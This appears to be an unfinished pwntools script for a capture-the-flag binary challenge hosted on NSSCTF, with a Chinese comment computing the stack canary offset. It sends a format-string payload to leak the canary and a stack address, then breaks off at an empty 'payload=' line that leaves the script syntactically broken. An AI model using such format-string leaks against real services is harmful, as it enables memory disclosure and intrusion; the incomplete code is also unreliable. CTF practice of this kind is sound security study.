from pwn import *
context(arch='amd64',os='linux')
elf=ELF('./pwn')
p=remote("node4.anna.nssctf.cn",24097)

# canary地址计算:(0x60-8)/8=11  11+6=17
payload=b'%17$paaa%19$p'

p.sendlineafter("Hi! What's your name? ",payload)

buf=p.recvuntil('!')
payload=

p.interactive()
